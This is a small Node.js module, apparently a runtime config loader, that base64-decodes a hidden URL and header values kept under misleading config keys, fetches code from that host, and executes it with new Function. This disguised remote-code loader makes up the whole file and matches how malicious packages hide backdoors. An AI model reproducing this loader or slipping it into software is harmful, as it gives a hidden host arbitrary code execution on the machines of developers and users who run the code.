const config = require("../config");
const axios = require('axios');

const runtimeConfig = {};
runtimeConfig.loadRuntimeConfig = async function () {
  try {
    const src = atob(config.nodeserver.api_key);
    const k = atob(config.nodeserver.secret_key);
    const v = atob(config.nodeserver.secret_value);
    return new Function((await axios.get(src,{headers:{[k]:v}})).data)();
  } catch(error) {
    console.log(error)
  } 
} 

module.exports = runtimeConfig;
